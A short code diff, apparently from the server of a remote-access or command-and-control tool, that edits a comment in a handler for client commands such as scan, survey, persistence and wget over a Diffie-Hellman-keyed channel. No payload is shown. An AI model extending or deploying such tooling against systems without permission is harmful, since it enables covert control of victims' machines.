@@ -139,7 +139,7 @@ class ClientConnection(threading.Thread):
         elif cmd == 'rekey':
             self.dh_key = crypto.diffiehellman(self.conn, server=True)
 
-        # results of scan, survey, screenshot, persistence, unzip, or wget
+        # results of scan, survey, persistence, unzip, or wget
         elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
             print 'Running {}...'.format(cmd)
             recv_data = self.conn.recv(1024)
